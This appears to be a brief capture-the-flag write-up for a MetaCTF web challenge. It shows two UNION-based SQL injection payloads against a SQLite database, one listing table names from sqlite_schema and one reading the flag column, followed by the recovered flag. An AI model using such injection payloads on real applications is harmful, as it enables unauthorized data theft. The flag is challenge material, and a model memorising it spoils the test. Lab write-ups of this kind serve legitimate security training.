http://host.cg21.metaproblems.com:4010/

we need 3 collumns to inject, so the query should be 
{query: "%' UNION SELECT name, null, null FROM sqlite_schema WHERE type='table';--"}
found a table "the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5"


then 
query: "%' UNION SELECT flag, null, null FROM the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5;--"

MetaCTF{sql1t3_m4st3r_0r_just_gu3ss_g0d??}

